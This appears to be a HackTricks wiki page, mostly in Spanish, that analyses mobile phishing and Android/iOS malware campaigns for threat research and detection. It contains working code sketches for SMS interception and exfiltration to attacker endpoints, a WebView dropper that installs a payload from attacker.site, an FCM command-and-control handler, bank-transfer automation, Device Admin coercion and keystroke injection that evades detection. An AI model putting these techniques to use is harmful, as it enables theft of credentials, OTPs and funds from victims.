# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cubre técnicas usadas por actores de amenazas para distribuir **malicious Android APKs** y **iOS mobile-configuration profiles** a través de phishing (SEO, ingeniería social, stores falsas, apps de citas, etc.).
> El material está adaptado de la campaña SarangTrap expuesta por Zimperium zLabs (2025) y otras investigaciones públicas.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrar docenas de dominios look-alike (dating, cloud share, car service…).
– Usar palabras clave en el idioma local y emojis en el elemento `<title>` para posicionar en Google.
– Hospedar *both* Android (`.apk`) e instrucciones de instalación iOS en la misma landing page.
2. **First Stage Download**
* Android: enlace directo a un APK *unsigned* o de “third-party store”.
* iOS: `itms-services://` o enlace HTTPS simple a un **mobileconfig** malicioso (ver más abajo).
3. **Post-install Social Engineering**
* Al primer lanzamiento la app solicita un **invitation / verification code** (ilusión de acceso exclusivo).
* El código se envía mediante POST sobre HTTP al Command-and-Control (C2).
* C2 responde `{"success":true}` ➜ el malware continúa.
* Análisis dinámico/Sandbox/AV que nunca envía un código válido no detecta comportamiento malicioso (evasión).
4. **Runtime Permission Abuse** (Android)
* Los permisos peligrosos solo se solicitan **después de una respuesta positiva del C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Variantes recientes **eliminan `<uses-permission>` para SMS del `AndroidManifest.xml`** pero mantienen la ruta de código Java/Kotlin que lee SMS vía reflection ⇒ baja la puntuación estática mientras sigue funcionando en dispositivos que conceden el permiso mediante abuso de `AppOps` o targets antiguos.
5. **Facade UI & Background Collection**
* La app muestra vistas inofensivas (visor de SMS, selector de galería) implementadas localmente.
* Mientras tanto exfiltra:
- IMEI / IMSI, número de teléfono
- Dump completo de `ContactsContract` (JSON array)
- JPEG/PNG desde `/sdcard/DCIM` comprimidos con [Luban](https://github.com/Curzibn/Luban) para reducir tamaño
- SMS opcionales (`content://sms`)
Los payloads se comprimen en batch-zip y se envían vía `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Un único perfil mobile-configuration puede solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc. para inscribir el dispositivo en una supervisión tipo “MDM”.
* Instrucciones de ingeniería social:
1. Abrir Settings ➜ *Profile downloaded*.
2. Pulsar *Install* tres veces (capturas en la página de phishing).
3. Confiar el perfil no firmado ➜ el atacante obtiene el entitlement de *Contacts* & *Photo* sin revisión de App Store.
7. **Network Layer**
* HTTP plano, a menudo en el puerto 80 con HOST header como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sin TLS → fácil de detectar).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Durante la evaluación del malware, automatizar la fase del invitation code con Frida/Objection para alcanzar la rama maliciosa.
* **Manifest vs. Runtime Diff** – Comparar `aapt dump permissions` con las solicitudes en tiempo de ejecución `PackageManager#getRequestedPermissions()`; la ausencia de permisos peligrosos es una señal de alerta.
* **Network Canary** – Configurar `iptables -p tcp --dport 80 -j NFQUEUE` para detectar ráfagas de POST sospechosas tras la entrada del código.
* **mobileconfig Inspection** – Usar `security cms -D -i profile.mobileconfig` en macOS para listar `PayloadContent` y detectar entitlements excesivos.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: bypass automático del código de invitación</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicadores (Genéricos)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Este patrón se ha observado en campañas que abusan de temas de beneficios gubernamentales para robar credenciales UPI indias y OTPs. Los operadores encadenan plataformas de confianza para la entrega y la resiliencia.

### Cadena de entrega a través de plataformas de confianza
- Señuelo en un video de YouTube → la descripción contiene un enlace corto
- Enlace corto → sitio de phishing en GitHub Pages que imita el portal legítimo
- El mismo repo de GitHub aloja un APK con una insignia falsa de “Google Play” que enlaza directamente al archivo
- Páginas de phishing dinámicas alojadas en Replit; el canal de comandos remoto usa Firebase Cloud Messaging (FCM)

### Dropper con payload embebido e instalación offline
- El primer APK es un instalador (dropper) que incluye el malware real en `assets/app.apk` y pide al usuario desactivar Wi‑Fi/datos móviles para mitigar la detección en la nube.
- El payload embebido se instala bajo una etiqueta inocua (p. ej., “Secure Update”). Después de la instalación, tanto el instalador como el payload están presentes como apps separadas.

Consejo de triage estático (grep para payloads embebidos):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Descubrimiento dinámico de endpoints vía shortlink
- Malware obtiene una lista en texto plano, separada por comas, de endpoints activos desde un shortlink; transformaciones simples de cadenas producen la ruta final de la página de phishing.

Ejemplo (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocódigo:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Recolección de credenciales UPI basada en WebView
- El paso “Make payment of ₹1 / UPI‑Lite” carga un formulario HTML atacante desde el endpoint dinámico dentro de un WebView y captura campos sensibles (teléfono, banco, PIN UPI) que se `POST`ean a `addup.php`.

Cargador mínimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Auto-propagación e intercepción de SMS/OTP
- Se solicitan permisos agresivos en la primera ejecución:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Los contactos se recorren para enviar masivamente smishing SMS desde el dispositivo de la víctima.
- Los SMS entrantes son interceptados por un broadcast receiver y subidos con metadatos (sender, body, SIM slot, per-device random ID) a `/addsm.php`.

Esquema del receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resistente
- El payload se registra en FCM; los push messages llevan un campo `_type` usado como switch para activar acciones (p. ej., actualizar plantillas de texto de phishing, alternar comportamientos).

Ejemplo de payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esquema del handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicadores/IOCs
- APK contiene una carga útil secundaria en `assets/app.apk`
- WebView carga el pago desde `gate.htm` y exfiltra a `/addup.php`
- Exfiltración de SMS a `/addsm.php`
- Recuperación de configuración mediante shortlinks (p. ej., `rebrand.ly/*`) que devuelve endpoints CSV
- Apps etiquetadas como genéricas “Update/Secure Update”
- Mensajes FCM `data` con un discriminador `_type` en apps no confiables

---

## APK Smuggling basado en Socket.IO/WebSocket + Páginas falsas de Google Play

Los atacantes reemplazan cada vez más los enlaces APK estáticos por un canal Socket.IO/WebSocket incrustado en cebos que imitan Google Play. Esto oculta la URL del payload, evade filtros de URL/extensión y preserva una experiencia de instalación realista.

Flujo típico del cliente observado en entornos reales:

<details>
<summary>Descargador falso de Play por Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Por qué evade controles simples:
- No se expone una URL APK estática; la payload se reconstruye en memoria a partir de frames de WebSocket.
- Los filtros URL/MIME/extensión que bloquean respuestas directas .apk pueden pasar por alto datos binarios tunelizados vía WebSockets/Socket.IO.
- Los crawlers y los URL sandboxes que no ejecutan WebSockets no recuperarán la payload.

Véase también WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Abuso de Android Accessibility/Overlay y Device Admin, automatización ATS y orquestación de relay NFC – estudio de caso RatOn

La campaña RatOn banker/RAT (ThreatFabric) es un ejemplo concreto de cómo las operaciones modernas de phishing móvil combinan WebView droppers, automatización de UI impulsada por Accessibility, overlays/ransom, coerción mediante Device Admin, Automated Transfer System (ATS), takeover de crypto wallets e incluso orquestación de relay NFC. Esta sección abstrae las técnicas reutilizables.

### Stage-1: WebView → puente de instalación nativa (dropper)
Los atacantes muestran un WebView que apunta a una página atacante e inyectan una interfaz JavaScript que expone un instalador nativo. Un toque en un botón HTML llama a código nativo que instala un APK de segunda etapa incluido en los assets del dropper y luego lo lanza directamente.

Patrón mínimo:

<details>
<summary>Patrón mínimo del dropper Stage-1 (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML en la página:
```html
<button onclick="bridge.installApk()">Install</button>
```
Después de la instalación, el dropper inicia el payload mediante explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Embudo de consentimiento: Accessibility + Device Admin + solicitudes de permisos en tiempo de ejecución posteriores
Stage-2 opens a WebView that hosts an “Access” page. Its button invokes an exported method that navigates the victim to the Accessibility settings and requests enabling the rogue service. Once granted, malware uses Accessibility to auto-click through subsequent runtime permission dialogs (contacts, overlay, manage system settings, etc.) and requests Device Admin.

- Accessibility programáticamente ayuda a aceptar las solicitudes posteriores encontrando botones como “Allow”/“OK” en el árbol de nodos y despachando clics.
- Comprobación/solicitud del permiso overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Phishing/chantaje por overlay vía WebView
Los operadores pueden emitir comandos para:
- mostrar un overlay a pantalla completa desde una URL, o
- pasar HTML inline que se carga en un overlay WebView.

Usos probables: coerción (ingreso de PIN), apertura de wallet para capturar PINs, mensajes de chantaje. Mantener un comando para asegurar que el permiso de overlay esté concedido si falta.

### Modelo de control remoto – pseudo-pantalla de texto + screen-cast
- Bajo ancho de banda: volcar periódicamente el árbol de nodos de Accessibility, serializar textos/roles/bounds visibles y enviarlos al C2 como una pseudo-pantalla (comandos como `txt_screen` una vez y `screen_live` continuo).
- Alta fidelidad: solicitar MediaProjection y empezar screen-casting/recording bajo demanda (comandos como `display` / `record`).

### ATS playbook (automatización de app bancaria)
Dada una tarea en JSON, abrir la app bancaria, controlar la UI vía Accessibility con una mezcla de consultas de texto y toques por coordenadas, e introducir el PIN de pago de la víctima cuando se solicite.

Ejemplo de tarea:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Textos de ejemplo vistos en un flujo objetivo (CZ → EN):
- "Nová platba" → "Nuevo pago"
- "Zadat platbu" → "Ingresar pago"
- "Nový příjemce" → "Nuevo destinatario"
- "Domácí číslo účtu" → "Número de cuenta nacional"
- "Další" → "Siguiente"
- "Odeslat" → "Enviar"
- "Ano, pokračovat" → "Sí, continuar"
- "Zaplatit" → "Pagar"
- "Hotovo" → "Hecho"

Los operadores también pueden comprobar/aumentar los límites de transferencia mediante comandos como `check_limit` y `limit` que navegan por la UI de límites de forma similar.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flujo: desbloquear (PIN robado o contraseña proporcionada), navegar a Security/Recovery, revelar/mostrar seed phrase, keylog/exfiltrate it. Implementar selectores conscientes de la localización (EN/RU/CZ/SK) para estabilizar la navegación entre idiomas.

### Device Admin coercion
Device Admin APIs se usan para aumentar las oportunidades de PIN-capture y para frustrar a la víctima:

- Bloqueo inmediato:
```java
dpm.lockNow();
```
- Expirar la credencial actual para forzar el cambio (Accessibility captura el nuevo PIN/contraseña):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzar el desbloqueo no biométrico deshabilitando las funciones biométricas de keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Many DevicePolicyManager controls require Device Owner/Profile Owner on recent Android; some OEM builds may be lax. Always validate on target OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. This enables contactless card-present cash-out alongside online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/estado: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Superposiciones: `overlay` (HTML en línea), `block` (URL), `block_off`, `access_tint`
- Billeteras: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Dispositivo: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comunicaciones/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors increasingly blend Accessibility-driven automation with anti-detection tuned against basic behaviour biometrics. A recent banker/RAT shows two complementary text-delivery modes and an operator toggle to simulate human typing with randomized cadence.

- Modo de descubrimiento: enumerar nodos visibles con selectores y bounds para apuntar con precisión a los inputs (ID, text, contentDescription, hint, bounds) antes de actuar.
- Inyección dual de texto:
- Modo 1 – `ACTION_SET_TEXT` directamente sobre el nodo objetivo (estable, sin teclado);
- Modo 2 – poner en el portapapeles + `ACTION_PASTE` en el nodo enfocado (funciona cuando setText directo está bloqueado).
- Cadencia similar a la humana: dividir la cadena proporcionada por el operador y entregarla carácter por carácter con retrasos aleatorios de 300–3000 ms entre eventos para evadir heurísticas de “escritura a velocidad de máquina”. Implementado ya sea aumentando progresivamente el valor vía `ACTION_SET_TEXT`, o pegando un carácter a la vez.

<details>
<summary>Esbozo Java: descubrimiento de nodos + entrada retrasada por carácter vía setText o clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlays de bloqueo para encubrir fraude:
- Renderiza un `TYPE_ACCESSIBILITY_OVERLAY` a pantalla completa con opacidad controlada por el operador; mantenlo opaco para la víctima mientras la automatización remota se ejecuta por debajo.
- Comandos típicamente expuestos: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay mínimo con alfa ajustable:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Primitivas de control del operador frecuentemente vistas: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (compartición de pantalla).

## Referencias

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
